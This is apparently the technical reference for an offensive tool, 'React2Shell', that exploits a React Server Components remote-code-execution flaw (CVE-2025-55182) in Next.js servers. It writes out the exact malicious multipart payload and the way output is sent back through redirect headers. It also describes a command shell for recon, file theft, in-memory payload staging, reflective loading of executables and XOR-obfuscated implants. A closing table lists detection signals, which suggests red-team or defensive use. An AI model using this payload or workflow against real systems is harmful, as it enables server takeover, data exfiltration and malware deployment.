# React2Shell Exploit Tool — Technical Reference

Exploit tool for CVE-2025-55182 (React Server Components RCE). Sends malicious multipart POST bodies to Next.js servers, exfiltrates output via `X-Action-Redirect` redirect header.

## Source Map

| File | Role |
|---|---|
| `run_exploit.py` | Interactive entry point → `exploit_tool.main.main()` |
| `exploit.py` | Single-shot standalone (`-t`, `-c`, `-f`, `-T`) |
| `exploit_tool/main.py` | CLI parser, creates `InteractiveShell` |
| `exploit_tool/shell.py` | REPL dispatch |
| `exploit_tool/engine.py` | HTTP session, POST, response parse |
| `exploit_tool/payload_generator.py` | Multipart body + JS injection builder |
| `exploit_tool/config.py` | URL normalization, timeout |
| `exploit_tool/theme.py` | ANSI color constants |
| `exploit_tool/commands/builtin.py` | `help`, `info`, `timeout`, `eval`, `history` |
| `exploit_tool/commands/recon.py` | `sysinfo`, `ipconfig`, `env`, `domain`, `ls`, `readfile` |
| `exploit_tool/commands/file_ops.py` | `upload`, `stage`, `decode`, `decompress`, `copyfile`, `rename`, `download`, `hide`, `pipeload`, `pipestage` |
| `exploit_tool/utils.py` | `to_charcode()` — JS string → `String.fromCharCode(...)` |
| `encode_payload.py` | Local file → base64 text (certutil-compatible) |
| `decode_payload.py` | Base64 text → binary |
| `compress_payload.py` | Gzip compress + optional base64 (T1027.015) |
| `encrypt_payload_xor.py` | Position-dependent XOR encode/decode matching CWLHerpaderping formula (T1027.013) |

## Exploit Mechanism

Multipart POST to target with:

```
Next-Action: x
Content-Type: multipart/form-data; boundary=----HacxMeBoundaryX9K2pLvN4MqR8TdF

field 0: {"then":"$1:__proto__:then","_response":{"_prefix":"<injected JS>"},"_formData":{"get":"$1:constructor:constructor"}}
field 1: "$@0"
field 2: []
```

Server deserializes attacker-controlled model → executes `_prefix` JS inside Node.js process. Output is exfiltrated by throwing a Next.js redirect:

```
NEXT_REDIRECT;push;/login?a=<base64(output)>;307;
```

`engine.py` reads `X-Action-Redirect`, URL-decodes, base64-decodes.

## JS Execution Modes

| Mode | Trigger | JS injected | Process created |
|---|---|---|---|
| `execSync` (default) | any unrecognized input | `child_process.execSync(cmd)` | `node.exe` → `cmd.exe` |
| `eval` | recon / file ops / `eval` builtin | `eval(String.fromCharCode(...))` | none (in-process) |
| `spawnSync` | `run <exe> [args]` | `cp.spawnSync(exe, args, {shell:false})` | `node.exe` → exe directly |

Complex JS uses `new Function(String.fromCharCode(...))()` when `var`/`return`/`try-catch` are needed inside a single expression.

## Shell Command Dispatch

| Command | Handler | Spawn? |
|---|---|---|
| `help`, `clear`, `info`, `history`, `timeout`, `eval` | `BuiltinCommands` | no |
| `sysinfo`, `ipconfig`, `env`, `domain`, `ls`, `readfile` | `ReconCommands` | no |
| `upload`, `stage`, `decode`, `decompress`, `copyfile`, `rename`, `download` | `FileOperations` | no |
| `hide` | `FileOperations` | yes — `spawnSync('attrib', ['+h', path])` |
| `pipeload` | `FileOperations` | yes — `spawnSync(loader, [], {input: [hdr+payload]})` |
| `pipestage` | `FileOperations` | yes — same as pipeload but payload streams from attacker memory |
| `run <exe>` | `InteractiveShell` | yes — `spawnSync(exe, args, {shell:false})` |
| default | `InteractiveShell` | yes — `execSync(cmd)` → `cmd.exe` |

## File Operation Details

### upload
Reads local `.b64` text, streams 2000-char chunks to target via eval (`writeFileSync` / `appendFileSync`). Leaves `.b64` file on target disk.

### stage `[--encrypt] <local_binary> <remote.bin>`
One-step upload-and-write with no `.b64` artifact on target:
1. Read raw bytes locally; optionally XOR-encode with `out[i] = in[i] ^ ((0xA3 + i*0x5B) & 0xFF)` if `--encrypt`.
2. Base64 in Python memory → stream 2000-char chunks into `global.__stageBuffer` via eval.
3. Single eval: `Buffer.from(global.__stageBuffer,'base64')` → `writeFileSync(dest)` → `delete global.__stageBuffer`.

Requires iisnode single-worker so `global` persists across requests.

### pipeload `<payload.b64> <CertEnrollAgent.exe>`
Reads `.b64` from target disk → decodes in Node.js memory → prepends 4-byte LE size header → `spawnSync(loader, [], {input: [hdr+payload]})`. T1620 — payload bytes never written as binary to disk.

### pipestage `<local_pe> <CertEnrollAgent.exe>`
Zero-artifact variant: streams raw PE from attacker memory (same `global.__stageBuffer` mechanism as `stage`) then immediately decodes and spawns loader with stdin pipe. No `.b64` or `.bin` written to target at any point. T1620.

### hide `<filepath>`
`spawnSync('attrib', ['+h', path])` — only operation that spawns `attrib.exe`. Intentionally observable for T1564.001.

### download `<remote_path>`
Stats file → readability pre-check via `new Function(...)()` → 8192-byte chunks via `openSync`/`readSync`/`closeSync` → base64 back through redirect header. Binary-safe, no size limit.

## Local Helpers

| Script | Function |
|---|---|
| `encode_payload.py` | raw → base64 text (64-char lines, optional `BEGIN CERTIFICATE` headers) |
| `decode_payload.py` | base64 text → raw binary |
| `compress_payload.py` | gzip level 9 + optional base64; ~62% reduction (T1027.015) |
| `encrypt_payload_xor.py` | XOR `out[i] = in[i] ^ ((0xA3 + i*0x5B) & 0xFF)`; self-inverse; MZ `0x4D` → `0xEE` on disk (T1027.013) |

`encrypt_payload_xor.py` constants match `PAYLOAD_XOR_BASE`/`PAYLOAD_XOR_STEP` in `CWLImplant.cpp` so CWLHerpaderping decodes the file in-memory when built with `/p:PayloadXOR=1`. Equivalent to `stage --encrypt` inline.

## Detection Signals

| Behavior | Observable |
|---|---|
| Exploit request | HTTP POST with `Next-Action: x`, boundary `----HacxMeBoundaryX9K2pLvN4MqR8TdF`, field `"$1:__proto__:then"` |
| Output channel | `X-Action-Redirect: /login?a=<base64>;307;` |
| OS command exec | `node.exe` → `cmd.exe` (default shell commands) |
| Direct spawn | `node.exe` → target exe, no `cmd.exe` (`run` command) |
| In-process recon | Node.js `os`/`dns`/`fs`/`path`/`process.env` — no child process |
| In-memory stage | Repeated POSTs accumulate `global.__stageBuffer`; single `writeFileSync` |
| XOR-encoded file on disk | No valid MZ header; first byte `0xEE` instead of `0x4D` (T1027.013) |
| Gzip payload | `.gz` upload + `zlib.gunzipSync()` in-process — no child process (T1027.015) |
| Hidden attribute | `node.exe` spawns `attrib.exe +h <path>` (T1564.001) |
| Reflective load (pipeload) | `node.exe` spawns `CertEnrollAgent.exe` with stdin pipe containing PE bytes (T1620) |
| Reflective load (pipestage) | same as pipeload; no `.b64` or `.bin` written at any stage (T1620) |
| File download | Repeated POSTs, base64 chunks returned in redirect header |
